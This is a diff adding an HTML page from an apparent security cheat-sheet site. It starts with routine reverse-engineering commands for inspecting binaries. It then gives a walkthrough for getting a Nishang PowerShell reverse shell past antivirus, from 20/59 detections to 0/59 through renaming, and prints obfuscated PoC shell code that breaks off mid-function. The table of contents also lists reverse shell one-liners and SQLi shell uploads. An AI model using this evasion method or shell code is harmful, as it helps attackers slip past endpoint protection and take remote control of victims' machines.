@@ -1,0 +1,1433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Reverse Engineering - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Reverse Engineering", url: "#_top", children: [
+              {title: "Static Analysis", url: "#static-analysis" },
+              {title: "Dynamic Analysis", url: "#dynamic-analysis" },
+          ]},
+          {title: "HOW TO PASS UNDER THE RADAR WITH POWERSHELL", url: "#how-to-pass-under-the-radar-with-powershell", children: [
+              {title: "Actual problem:", url: "#actual-problem" },
+              {title: "Installation", url: "#installation" },
+              {title: "Basic Usage", url: "#basic-usage" },
+              {title: "Binary Exploitation", url: "#binary-exploitation" },
+              {title: "False Information Inserting", url: "#false-information-inserting" },
+              {title: "When victim see the content of the bash_history, malicious command may be executed by the victim\u2019s misunderstanding.", url: "#when-victim-see-the-content-of-the-bash_history-malicious-command-may-be-executed-by-the-victims-misunderstanding" },
+              {title: "Using Enhanced GDB", url: "#using-enhanced-gdb" },
+              {title: "Start Debugger", url: "#start-debugger" },
+              {title: "Commands in GDB", url: "#commands-in-gdb" },
+              {title: "Online Generator", url: "#online-generator" },
+              {title: "Bash", url: "#bash" },
+              {title: "Netcat OpenBSD", url: "#netcat-openbsd" },
+              {title: "Ncat", url: "#ncat" },
+              {title: "NodeJS", url: "#nodejs" },
+              {title: "Perl", url: "#perl" },
+              {title: "PHP", url: "#php" },
+              {title: "Python", url: "#python" },
+              {title: "Ruby", url: "#ruby" },
+              {title: "PowerShell", url: "#powershell" },
+              {title: "Nishang", url: "#nishang" },
+              {title: "Generate Reverse Shell Payload", url: "#generate-reverse-shell-payload" },
+              {title: "Then a user in target machine executes this file, we may be able to get a shell of target system.", url: "#then-a-user-in-target-machine-executes-this-file-we-may-be-able-to-get-a-shell-of-target-system" },
+              {title: "Commands", url: "#commands" },
+              {title: "Code Analysis", url: "#code-analysis_1" },
+              {title: "jd-gui", url: "#jd-gui" },
+              {title: "Oledump", url: "#oledump" },
+              {title: "Olevba", url: "#olevba" },
+              {title: "PE Headers", url: "#pe-headers" },
+              {title: "Identify Packers of Packed Executable", url: "#identify-packers-of-packed-executable" },
+              {title: "Debugging", url: "#debugging_1" },
+              {title: "Decompile", url: "#decompile" },
+              {title: "uncompyle6 example.pyc", url: "#uncompyle6-examplepyc" },
+              {title: "*Using Cutter", url: "#using-cutter" },
+              {title: "Start Debugging", url: "#start-debugging" },
+              {title: "Analyze", url: "#analyze" },
+              {title: "Print Usage", url: "#print-usage" },
+              {title: "Visual Mode", url: "#visual-mode" },
+              {title: "Debug", url: "#debug_1" },
+              {title: "Seek", url: "#seek" },
+              {title: "Print", url: "#print" },
+              {title: "Write", url: "#write" },
+              {title: "Expressions", url: "#expressions" },
+              {title: "Information about Binary File", url: "#information-about-binary-file" },
+              {title: "Reopen Current File", url: "#reopen-current-file" },
+              {title: "Ctrl+z stty raw -echo;fg Enter x2 export TERM=xterm", url: "#ctrlz-stty-raw-echofg-enter-x2-export-termxterm" },
+              {title: "PHP Reverse Shell (Linux)", url: "#php-reverse-shell-linux" },
+              {title: "PHP Revese Shell (Windows)", url: "#php-revese-shell-windows" },
+              {title: "Python Reverse Shell (Linux)", url: "#python-reverse-shell-linux" },
+              {title: "ASP.NET", url: "#aspnet" },
+              {title: "Upload Script via SQLi", url: "#upload-script-via-sqli" },
+              {title: "Useful Tools", url: "#useful-tools" },
+              {title: "Shell Script \u0026amp; Remote Code Execution (RCE)", url: "#shell-script-remote-code-execution-rce" },
+              {title: "Common", url: "#common" },
+              {title: "dt (Display Type)", url: "#dt-display-type" },
+              {title: "? (Evaluate Expression)", url: "#evaluate-expression" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="reverse-engineering">Reverse Engineering</h1>
+<p>Analyze and get the knowledge of executables.</p>
+<h2 id="static-analysis">Static Analysis</h2>
+<h3 id="file-information">File Information</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>file ./executable
+</span></code></pre></div>
+<h3 id="printable-contents">Printable Contents</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>strings ./executable
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a># Get lines which include specific keyword
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a># -i: Ignore case
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a># -B: Print before N lines of target line
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a># -A: Print after N lines of target line
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>strings ./executable | grep -i password -B 5 -A 5
+</span></code></pre></div>
+<h3 id="shared-object-library-dependencies">Shared Object (Library) Dependencies</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ldd ./executable
+</span></code></pre></div>
+<h3 id="object-information">Object Information</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># -f: Display file headers
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>objdump -f ./executable
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a># -p: Print information that is specific to the object file format
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>objdump -p ./executable
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a># -h: Display section headers
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>objdump -h ./executable
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a># -d: Disassebmle executable sections
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a># -M intel: Specify Intel syntax
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>objdump -dM intel ./executable
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a># -D: Disassemble all
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>objdump -DM intel ./executable
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a># -s: Display full contents of any sections
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>objdump -s ./executable
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a># -x: Display all headers
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>objdump -x ./executable
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a># -g: Display debug information
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>objdump -g ./executable
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a># -t: Display the symbol table
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>objdump -t ./executable
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a># -T: Display the dynamic symbol table
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>objdump -T ./executable
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>
+</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a># -R: Display the dynamic relocation table
+</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>objdump -R ./executable
+</span></code></pre></div>
+<h3 id="contents-in-hexadecimal-asci">Contents in Hexadecimal &amp; ASCI</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># -C: Canonical hex+ASCII display
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>hexdump -C ./executable
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a># less: Open pager
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>hexdump -C ./executable | less
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>xxd ./executable
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a># less: Open pager
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>xxd ./executable | less
+</span></code></pre></div>
+<h3 id="packer-detection">Packer Detection</h3>
+<p>To check if a binary is compressed with packer such as UPX, dump the hex and extract text related to the packer as below.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a># -B: Print before 20 lines from matched string.
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a># -A: Print after 20 lines from matched string.
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>hd ./sample | grep UPX -B 20 -A 20
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>xxd ./sample | grep UPX -B 20 -A 20
+</span></code></pre></div>
+<p>If found, we can decompress it.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>upx -d ./sample 
+</span></code></pre></div>
+<h3 id="security-properties">Security Properties</h3>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>checksec<span class="w"> </span>--file<span class="o">=</span>./sample
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RELRO</td>
+<td>Relocation Read-Only, which makes the global offset table (GOT) read-only.</td>
+</tr>
+<tr>
+<td>Stack Canaries</td>
+<td>Tokens placed after a stack to detect a stack overflow.</td>
+</tr>
+<tr>
+<td>NX</td>
+<td>Non-Executable. It prevents from shellcode.</td>
+</tr>
+<tr>
+<td>RWX</td>
+<td>Read-Write-Executable. It's vulnerable to shellcode.</td>
+</tr>
+<tr>
+<td>PIE</td>
+<td>Position Independent Executable. It loads the program dependencies into random locations.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="code-analysis">Code Analysis</h3>
+<ul>
+<li><a href="https://dogbolt.org/">Decompiler Explorer</a></li>
+<li>Ghidra</li>
+</ul>
+<p><br /></p>
+<h2 id="dynamic-analysis">Dynamic Analysis</h2>
+<h3 id="tracing">Tracing</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a># Executa binary and trace library calls
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>ltrace ./executable
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a># Executa binary and trace system calls and signals
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>strace -f ./executable
+</span></code></pre></div>
+<h3 id="debugging">Debugging</h3>
+<ul>
+<li><a href="./angr-cheatsheet">Angr</a></li>
+<li><a href="https://github.com/icsharpcode/AvaloniaILSpy">AvaloniaILSpy</a></li>
+<li>Cutter</li>
+<li><a href="./gdb-cheatsheet">GDB</a></li>
+<li><a href="https://github.com/icsharpcode/ILSpy">ILSpy</a></li>
+<li><a href="./rizin-cheatsheet">Rizin</a></li>
+<li><a href="./windbg-cheatsheet">WinDBG</a></li>
+</ul>
+<h1 id="how-to-pass-under-the-radar-with-powershell">HOW TO PASS UNDER THE RADAR WITH POWERSHELL</h1>
+<h2 id="actual-problem">Actual problem:</h2>
+<p>Nishang Powershell reverse shell is detected by the most AV. After remote commande execution you will be blocked by end point protections.
+This article demonstrate how it is possible to manualy reach the 0 detection with 59 AV engines.</p>
+<h3 id="base-line">Base line:</h3>
+<p>Nishang script is a very nice tool and can be used for Reverse or Bind interactive PowerShell from a target.</p>
+<p><img alt="" src="/images/poc1.png" title="Initial detection" />
+<center><b>SCORE :20/59</b></center><br></p>
+<h3 id="stage-1">STAGE 1</h3>
+<p>Remove dev comments, change output error, remove link, synopsis, description, example.</p>
+<p><img alt="" src="/images/poc2.png" title="stage 1" />
+<center><b>SCORE :12/59</b></center><br></p>
+<h3 id="stage-2">STAGE 2</h3>
+<p>Change functions names.</p>
+<p><img alt="" src="/images/poc3.png" title="stage 2" />
+<center><b>SCORE: 11/59</b></center><br></p>
+<h3 id="stage-3">STAGE 3</h3>
+<p>Change 50% variables names with random strings.</p>
+<p><img alt="" src="/images/poc4.png" title="stage 3" />
+<center><b>SCORE: 11/59</b></center><br></p>
+<h3 id="stage-4">STAGE 4</h3>
+<p>Change 90% variables names with random strings.</p>
+<p><img alt="" src="/images/poc5.png" title="stage 4" />
+<center><b>SCORE: 3/59</b></center><br></p>
+<h3 id="stage-5">STAGE 5</h3>
+<p>Remove Run as comment, Microsoft motd, change ASCII prompt.</p>
+<p><img alt="" src="/images/poc6.png" title="stage 5" />
+<center><b>SCORE: 1/59</b></center><br></p>
+<h3 id="stage-6">STAGE 6</h3>
+<p>Change 95% variables names with random strings.</p>
+<p><img alt="" src="/images/poc7.png" title="stage 6" />
+<center><b>SCORE: 0/59</b></center><br></p>
+<p><center><b>Powershell escape is mainly done by changing function names, variable names, developer comments.</b></center></p>
+<h3 id="final-test"><center>FINAL TEST</center></h3>
+<p><img alt="" src="/images/poc8.png" title="stage 6" /></p>
+<h3 id="poc-source-code"><u>POC SOURCE CODE:</u></h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">function</span> <span class="nb">Invoke-Shell</span> 
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="p">{</span> 
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    <span class="p">[</span><span class="k">CmdletBinding</span><span class="p">(</span><span class="n">DefaultParameterSetName</span><span class="p">=</span><span class="s2">&quot;reverse&quot;</span><span class="p">)]</span> <span class="k">Param</span><span class="p">(</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Position</span> <span class="p">=</span> <span class="n">0</span><span class="p">,</span> <span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$true</span><span class="p">,</span> <span class="k">ParameterSetName</span><span class="p">=</span><span class="s2">&quot;reverse&quot;</span><span class="p">)]</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Position</span> <span class="p">=</span> <span class="n">0</span><span class="p">,</span> <span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$false</span><span class="p">,</span> <span class="k">ParameterSetName</span><span class="p">=</span><span class="s2">&quot;bind&quot;</span><span class="p">)]</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>        <span class="no">[String]</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>        <span class="nv">$World</span><span class="p">,</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Position</span> <span class="p">=</span> <span class="n">1</span><span class="p">,</span> <span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$true</span><span class="p">,</span> <span class="k">ParameterSetName</span><span class="p">=</span><span class="s2">&quot;reverse&quot;</span><span class="p">)]</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Position</span> <span class="p">=</span> <span class="n">1</span><span class="p">,</span> <span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$true</span><span class="p">,</span> <span class="k">ParameterSetName</span><span class="p">=</span><span class="s2">&quot;bind&quot;</span><span class="p">)]</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>        <span class="no">[Int]</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>        <span class="nv">$Country</span><span class="p">,</span>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">ParameterSetName</span><span class="p">=</span><span class="s2">&quot;reverse&quot;</span><span class="p">)]</span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>        <span class="no">[Switch]</span>
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>        <span class="nv">$Reverse</span><span class="p">,</span>
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>        <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">ParameterSetName</span><span class="p">=</span><span class="s2">&quot;bind&quot;</span><span class="p">)]</span>
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>        <span class="no">[Switch]</span>
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>        <span class="nv">$Bind</span>
+</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
+</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>    <span class="p">)</span>
+</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>
+</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>    <span class="k">try</span> 
+</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>    <span class="p">{</span>
+</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$Reverse</span><span class="p">)</span>
+</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>        <span class="p">{</span>
+</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>            <span class="nv">$dGtrfokiudfjhvnjfe</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="nv">$World</span><span class="p">,</span><span class="nv">$Country</span><span class="p">)</span>
+</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>        <span class="p">}</span>
+</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>
+</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$Bind</span><span class="p">)</span>
+</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>        <span class="p">{</span>
+</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>            <span class="nv">$eDDfh987654567</span> <span class="p">=</span> <span class="no">[System.Net.Sockets.TcpListener]</span><span class="nv">$Country</span>
+</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>            <span class="nv">$eDDfh987654567</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>    
+</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>            <span class="nv">$dGtrfokiudfjhvnjfe</span> <span class="p">=</span> <span class="nv">$eDDfh987654567</span><span class="p">.</span><span class="n">AcceptTcpClient</span><span class="p">()</span>
+</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a>        <span class="p">}</span> 
+</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a>
+</span><span id="__span-9-39"><a id="__codelineno-9-39" name="__codelineno-9-39" href="#__codelineno-9-39"></a>        <span class="nv">$zrt54789dvbgH</span> <span class="p">=</span> <span class="nv">$dGtrfokiudfjhvnjfe</span><span class="p">.</span><span class="n">GetStream</span><span class="p">()</span>
+</span><span id="__span-9-40"><a id="__codelineno-9-40" name="__codelineno-9-40" href="#__codelineno-9-40"></a>        <span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">}</span>
+</span><span id="__span-9-41"><a id="__codelineno-9-41" name="__codelineno-9-41" href="#__codelineno-9-41"></a>
+</span><span id="__span-9-42"><a id="__codelineno-9-42" name="__codelineno-9-42" href="#__codelineno-9-42"></a>        <span class="nv">$gfklighloiujGHds</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="s2">&quot;Windows PowerShell</span><span class="se">`n</span><span class="s2">Microsoft Corporation.</span><span class="se">`n`n</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-9-43"><a id="__codelineno-9-43" name="__codelineno-9-43" href="#__codelineno-9-43"></a>        <span class="nv">$zrt54789dvbgH</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$gfklighloiujGHds</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$gfklighloiujGHds</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+</span><span id="__span-9-44"><a id="__codelineno-9-44" name="__codelineno-9-44" href="#__codelineno-9-44"></a>
+</span><span id="__span-9-45"><a id="__codelineno-9-45" name="__codelineno-9-45" href="#__codelineno-9-45"></a>        <span class="nv">$gfklighloiujGHds</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="s1">&#39;$ &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="nb">Get-Location</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">)</span>
+</span><span id="__span-9-46"><a id="__codelineno-9-46" name="__codelineno-9-46" href="#__codelineno-9-46"></a>        <span class="nv">$zrt54789dvbgH</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$gfklighloiujGHds</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$gfklighloiujGHds</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+</span><span id="__span-9-47"><a id="__codelineno-9-47" name="__codelineno-9-47" href="#__codelineno-9-47"></a>
+</span><span id="__span-9-48"><a id="__codelineno-9-48" name="__codelineno-9-48" href="#__codelineno-9-48"></a>        <span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$zrt54789dvbgH</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span>
+</span><span id="__span-9-49"><a id="__codelineno-9-49" name="__codelineno-9-49" href="#__codelineno-9-49"></a>        <span class="p">{</span>
+</span><span id="__span-9-50"><a id="__codelineno-9-50" name="__codelineno-9-50" href="#__codelineno-9-50"></a>            <span class="nv">$EncodedText</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span>
+</span><span id="__span-9-51"><a id="__codelineno-9-51" name="__codelineno-9-51" href="#__codelineno-9-51"></a>            <span class="nv">$data</span> <span class="p">=</span> <span class="nv">$EncodedText</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span>
+</span><span id="__span-9-52"><a id="__codelineno-9-52" name="__codelineno-9-52" href="#__codelineno-9-52"></a>            <span class="k">try</span>
+</span><span id="__span-9-53"><a id="__codelineno-9-53" name="__codelineno-9-53" href="#__codelineno-9-53"></a>            <span class="p">{</span>
